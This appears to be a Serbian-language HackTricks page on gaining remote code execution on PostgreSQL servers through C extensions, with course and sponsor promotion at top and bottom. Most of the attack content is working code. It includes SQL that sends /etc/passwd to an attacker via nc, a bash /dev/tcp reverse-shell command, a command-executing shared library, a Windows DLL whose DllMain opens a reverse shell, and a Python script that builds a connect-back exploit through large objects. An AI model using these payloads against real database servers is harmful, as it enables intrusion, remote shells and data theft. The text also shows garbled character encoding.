# RCE sa PostgreSQL ekstenzijama

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetiƒçku bezbednost**? ≈Ωelite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili ≈æelite pristup **najnovijoj verziji PEASS ili preuzimanje HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridru≈æite se** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repozitorijum](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repozitorijum](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## PostgreSQL Ekstenzije

PostgreSQL je razvijen sa pro≈°irivosti kao osnovnom karakteristikom, omoguƒáavajuƒái mu da bez problema integri≈°e ekstenzije kao da su ugraƒëene funkcionalnosti. Ove ekstenzije, su≈°tinski biblioteke napisane u C-u, obogaƒáuju bazu podataka dodatnim funkcijama, operatorima ili tipovima.

Od verzije 8.1 nadalje, postavljen je specifiƒçan zahtev za ekstenzione biblioteke: moraju biti kompajlirane sa posebnim zaglavljem. Bez toga, PostgreSQL ih neƒáe izvr≈°iti, obezbeƒëujuƒái da se koriste samo kompatibilne i potencijalno bezbedne ekstenzije.

Takoƒëe, imajte na umu da **ako ne znate kako da** [**dostavite fajlove ≈ærtvi zloupotrebom PostgreSQL-a, trebalo bi da proƒçitate ovaj post.**](big-binary-files-upload-postgresql.md)

### RCE u Linux-u

**Za vi≈°e informacija proverite: [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)**

Izvr≈°avanje sistemskih komandi iz PostgreSQL 8.1 i ranijih verzija je proces koji je jasno dokumentovan i jednostavan. Moguƒáe je koristiti ovaj: [Metasploit modul](https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload).
```sql
CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');

# You can also create functions to open and write files
CREATE OR REPLACE FUNCTION open(cstring, int, int) RETURNS int AS '/lib/libc.so.6', 'open' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION write(int, cstring, int) RETURNS int AS '/lib/libc.so.6', 'write' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION close(int) RETURNS int AS '/lib/libc.so.6', 'close' LANGUAGE 'C' STRICT;
```
<details>

<summary>Napi≈°ite binarni fajl iz base64</summary>

Za pisanje binarnog fajla u postgresu mo≈æda ƒáe vam biti potrebno koristiti base64, to ƒáe biti korisno za tu svrhu:
```sql
CREATE OR REPLACE FUNCTION write_to_file(file TEXT, s TEXT) RETURNS int AS
$$
DECLARE
fh int;
s int;
w bytea;
i int;
BEGIN
SELECT open(textout(file)::cstring, 522, 448) INTO fh;

IF fh <= 2 THEN
RETURN 1;
END IF;

SELECT decode(s, 'base64') INTO w;

i := 0;
LOOP
EXIT WHEN i >= octet_length(w);

SELECT write(fh,textout(chr(get_byte(w, i)))::cstring, 1) INTO rs;

IF rs < 0 THEN
RETURN 2;
END IF;

i := i + 1;
END LOOP;

SELECT close(fh) INTO rs;

RETURN 0;

END;
$$ LANGUAGE 'plpgsql';
```
</details>

Meƒëutim, kada je poku≈°ano na veƒáim verzijama **prikazana je sledeƒáa gre≈°ka**:
```c
ERROR:  incompatible library ‚Äú/lib/x86_64-linux-gnu/libc.so.6‚Äù: missing magic block
HINT:  Extension libraries are required to use the PG_MODULE_MAGIC macro.
```
Ova gre≈°ka je obja≈°njena u [PostgreSQL dokumentaciji](https://www.postgresql.org/docs/current/static/xfunc-c.html):

> Kako bi se osiguralo da se dinamiƒçki uƒçitana objektna datoteka ne uƒçita u nekompatibilni server, PostgreSQL proverava da li datoteka sadr≈æi "magiƒçni blok" sa odgovarajuƒáim sadr≈æajem. Ovo omoguƒáava serveru da otkrije oƒçigledne nekompatibilnosti, kao ≈°to je kod kompajliran za drugu glavnu verziju PostgreSQL-a. Magiƒçni blok je obavezan od PostgreSQL verzije 8.2. Da biste ukljuƒçili magiƒçni blok, napi≈°ite ovo u jednoj (i samo jednoj) od izvornih datoteka modula, nakon ≈°to ste ukljuƒçili zaglavlje fmgr.h:
>
> `#ifdef PG_MODULE_MAGIC`\
> `PG_MODULE_MAGIC;`\
> `#endif`

Od verzije PostgreSQL-a 8.2, proces za napadaƒça da iskoristi sistem je postao izazovniji. Napadaƒç mora ili koristiti biblioteku koja veƒá postoji na sistemu ili otpremiti prilagoƒëenu biblioteku. Ova prilagoƒëena biblioteka mora biti kompajlirana protiv kompatibilne glavne verzije PostgreSQL-a i mora ukljuƒçivati odreƒëeni "magiƒçni blok". Ova mera znaƒçajno poveƒáava te≈æinu iskori≈°ƒáavanja PostgreSQL sistema, jer zahteva dublje razumevanje arhitekture sistema i kompatibilnosti verzija.

#### Kompajlirajte biblioteku

Dobijte verziju PostgreSQL-a sa:
```sql
SELECT version();
PostgreSQL 9.6.3 on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18) 6.3.0 20170516, 64-bit
```
Za kompatibilnost, bitno je da se glavne verzije poklapaju. Stoga, kompajliranje biblioteke sa bilo kojom verzijom unutar serije 9.6.x trebalo bi da obezbedi uspe≈°nu integraciju.


Za instalaciju te verzije na va≈°em sistemu:
```bash
apt install postgresql postgresql-server-dev-9.6
```
I kompajlirajte biblioteku:
```c
//gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c
#include <string.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PG_FUNCTION_INFO_V1(pg_exec);
Datum pg_exec(PG_FUNCTION_ARGS) {
char* command = PG_GETARG_CSTRING(0);
PG_RETURN_INT32(system(command));
}
```
Zatim otpremite kompajliranu biblioteku i izvr≈°ite komande pomoƒáu:
```bash
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
SELECT sys('bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"');
#Notice the double single quotes are needed to scape the qoutes
```
Mo≈æete pronaƒái ovu **biblioteku prekompajliranu** za nekoliko razliƒçitih verzija PostgreSQL-a, ƒçak mo≈æete **automatizovati ovaj proces** (ako imate pristup PostgreSQL-u) sa:

{% embed url="https://github.com/Dionach/pgexec" %}

### RCE u Windows-u

Sledeƒáa DLL datoteka uzima kao ulaz **ime binarne** datoteke i **broj** **puta** koje ≈æelite da je izvr≈°ite i izvr≈°ava je:
```c
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum pgsql_exec(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(pgsql_exec);

/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed*/
Datum
pgsql_exec(PG_FUNCTION_ARGS)
{
/* convert text pointer to C string */
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

/* retrieve the second argument that is passed to the function (an integer)
that will serve as our counter limit*/

int instances = PG_GETARG_INT32(1);

for (int c = 0; c < instances; c++) {
/*launch the process passed in the first parameter*/
ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
}
PG_RETURN_VOID();
}
```
Mo≈æete pronaƒái DLL kompajliran u ovom zip fajlu:

{% file src="../../../.gitbook/assets/pgsql_exec.zip" %}

Mo≈æete naznaƒçiti ovom DLL-u **koji binarni fajl da izvr≈°i** i broj puta da ga izvr≈°i, u ovom primeru ƒáe izvr≈°iti `calc.exe` 2 puta:
```bash
CREATE OR REPLACE FUNCTION remote_exec(text, integer) RETURNS void AS '\\10.10.10.10\shared\pgsql_exec.dll', 'pgsql_exec' LANGUAGE C STRICT;
SELECT remote_exec('calc.exe', 2);
DROP FUNCTION remote_exec(text, integer);
```
U [**ovde**](https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html) mo≈æete pronaƒái ovaj reverzni shell:
```c
#define PG_REVSHELL_CALLHOME_SERVER "10.10.10.10"
#define PG_REVSHELL_CALLHOME_PORT "4444"

#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <winsock2.h>

#pragma comment(lib,"ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

#pragma warning(push)
#pragma warning(disable: 4996)
#define _WINSOCK_DEPRECATED_NO_WARNINGS

BOOL WINAPI DllMain(_In_ HINSTANCE hinstDLL,
_In_ DWORD fdwReason,
_In_ LPVOID lpvReserved)
{
WSADATA wsaData;
SOCKET wsock;
struct sockaddr_in server;
char ip_addr[16];
STARTUPINFOA startupinfo;
PROCESS_INFORMATION processinfo;

char *program = "cmd.exe";
const char *ip = PG_REVSHELL_CALLHOME_SERVER;
u_short port = atoi(PG_REVSHELL_CALLHOME_PORT);

WSAStartup(MAKEWORD(2, 2), &wsaData);
wsock = WSASocket(AF_INET, SOCK_STREAM,
IPPROTO_TCP, NULL, 0, 0);

struct hostent *host;
host = gethostbyname(ip);
strcpy_s(ip_addr, sizeof(ip_addr),
inet_ntoa(*((struct in_addr *)host->h_addr)));

server.sin_family = AF_INET;
server.sin_port = htons(port);
server.sin_addr.s_addr = inet_addr(ip_addr);

WSAConnect(wsock, (SOCKADDR*)&server, sizeof(server),
NULL, NULL, NULL, NULL);

memset(&startupinfo, 0, sizeof(startupinfo));
startupinfo.cb = sizeof(startupinfo);
startupinfo.dwFlags = STARTF_USESTDHANDLES;
startupinfo.hStdInput = startupinfo.hStdOutput =
startupinfo.hStdError = (HANDLE)wsock;

CreateProcessA(NULL, program, NULL, NULL, TRUE, 0,
NULL, NULL, &startupinfo, &processinfo);

return TRUE;
}

#pragma warning(pop) /* re-enable 4996 */

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum dummy_function(PG_FUNCTION_ARGS);

PG_FUNCTION_INFO_V1(add_one);

Datum dummy_function(PG_FUNCTION_ARGS)
{
int32 arg = PG_GETARG_INT32(0);

PG_RETURN_INT32(arg + 1);
}
```
Zabele≈æite kako je u ovom sluƒçaju **zlonamerni kod unutar funkcije DllMain**. To znaƒçi da u ovom sluƒçaju nije potrebno izvr≈°iti uƒçitanu funkciju u postgresql-u, samo **uƒçitavanje DLL-a** ƒáe **izvr≈°iti** obrnutu ljusku:
```c
CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS '\\10.10.10.10\shared\dummy_function.dll', 'dummy_function' LANGUAGE C STRICT;
```
### RCE u najnovijim verzijama Prostgresa

U **najnovijim verzijama** PostgreSQL-a, nametnuta su ograniƒçenja gde je `superuser` **zabranjen** da **uƒçitava** deljene biblioteke osim iz odreƒëenih direktorijuma, poput `C:\Program Files\PostgreSQL\11\lib` na Windows-u ili `/var/lib/postgresql/11/lib` na \*nix sistemima. Ovi direktorijumi su **za≈°tiƒáeni** od operacija pisanja od strane NETWORK\_SERVICE ili postgres naloga.

Uprkos ovim ograniƒçenjima, moguƒáe je da autentifikovani baza podataka `superuser` **pi≈°e binarne fajlove** na fajl sistem koristeƒái "large objects." Ova moguƒánost se prote≈æe na pisanje unutar direktorijuma `C:\Program Files\PostgreSQL\11\data`, ≈°to je kljuƒçno za operacije baze podataka poput a≈æuriranja ili kreiranja tabela.

Znaƒçajna ranjivost proizilazi iz `CREATE FUNCTION` komande, koja **dozvoljava pretragu direktorijuma** u data direktorijumu. Stoga, autentifikovani napadaƒç mo≈æe **iskoristiti ovu pretragu** da napi≈°e deljenu biblioteku u data direktorijum, a zatim je **uƒçita**. Ova eksploatacija omoguƒáava napadaƒçu da izvr≈°i proizvoljan kod, posti≈æuƒái izvr≈°enje nativnog koda na sistemu.

#### Tok napada

Prvo morate **koristiti velike objekte za otpremanje dll fajla**. Mo≈æete videti kako to uraditi ovde:

{% content-ref url="big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

Kada otpremite ekstenziju (sa imenom poc.dll za ovaj primer) u data direktorijum, mo≈æete je uƒçitati sa:
```c
create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;
select connect_back('192.168.100.54', 1234);
```
_Napomena da nije potrebno dodati ekstenziju `.dll` jer ƒáe funkcija za kreiranje dodati._

Za vi≈°e informacija **proƒçitajte** [**originalnu publikaciju ovde**](https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html)**.**\
U toj publikaciji **ovo je bio** [**k√¥d koji se koristi za generisanje postgres ekstenzije**](https://github.com/sourceincite/tools/blob/master/pgpwn.c) (_za nauƒçiti kako kompajlirati postgres ekstenziju proƒçitajte bilo koju od prethodnih verzija_).\
Na istoj stranici dat je ovaj **eksploit za automatizaciju** ove tehnike:
```python
#!/usr/bin/env python3
import sys

if len(sys.argv) != 4:
print("(+) usage %s <connectback> <port> <dll/so>" % sys.argv[0])
print("(+) eg: %s 192.168.100.54 1234 si-x64-12.dll" % sys.argv[0])
sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
lib = sys.argv[3]
with open(lib, "rb") as dll:
d = dll.read()
sql = "select lo_import('C:/Windows/win.ini', 1337);"
for i in range(0, len(d)//2048):
start = i * 2048
end   = (i+1) * 2048
if i == 0:
sql += "update pg_largeobject set pageno=%d, data=decode('%s', 'hex') where loid=1337;" % (i, d[start:end].hex())
else:
sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % (i, d[start:end].hex())
if (len(d) % 2048) != 0:
end   = (i+1) * 2048
sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % ((i+1), d[end:].hex())

sql += "select lo_export(1337, 'poc.dll');"
sql += "create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;"
sql += "select connect_back('%s', %d);" % (host, port)
print("(+) building poc.sql file")
with open("poc.sql", "w") as sqlfile:
sqlfile.write(sql)
print("(+) run poc.sql in PostgreSQL using the superuser")
print("(+) for a db cleanup only, run the following sql:")
print("    select lo_unlink(l.oid) from pg_largeobject_metadata l;")
print("    drop function connect_back(text, integer);")
```
## Reference

* [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
* [https://www.exploit-db.com/papers/13084](https://www.exploit-db.com/papers/13084)

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetiƒçku bezbednost**? ≈Ωelite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili ≈æelite pristup **najnovijoj verziji PEASS-a ili preuzimanje HackTricks-a u PDF-u**? Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridru≈æite se** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi** ili me **pratite** na **Twitteru** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova u [hacktricks repozitorijum](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repozitorijum](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
